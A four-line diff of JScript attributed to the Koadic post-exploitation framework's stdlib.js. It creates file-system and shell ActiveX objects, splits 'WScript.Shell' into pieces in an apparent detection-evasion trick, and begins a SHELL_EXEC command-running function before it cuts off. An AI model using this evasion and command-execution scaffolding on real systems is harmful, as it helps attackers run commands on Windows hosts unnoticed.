@@ -1,4 +1,4 @@
-//Code from Koa/**/dic stdlib.js
+//Code from Koadic stdlib.js
 var FS = new ActiveXObject("Scripting.FileSystemObject");
 var WS = new ActiveXObject("WScrip"+"t.Shell");
 SHELL_EXEC = function(cmd) {
